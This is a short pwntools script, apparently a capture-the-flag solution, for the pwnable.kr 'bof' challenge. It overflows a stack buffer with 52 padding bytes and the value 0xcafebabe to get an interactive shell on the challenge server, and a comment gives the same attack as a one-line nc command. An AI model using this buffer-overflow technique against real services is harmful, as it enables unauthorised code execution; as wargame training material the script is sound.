from pwn import *

# bof
host = 'pwnable.kr'
port = 9000

# Notes
#  * One line shell script solution:
# `(python -c "import base64; print 'a'*52+'\xbe\xba\xfe\xca'" ; cat -) | nc pwnable.kr 9000`

def attack():
  r = remote(host, port)
  r.send('A' * 52 + p32(0xcafebabe))
  r.interactive()

if __name__ == '__main__':
  attack()
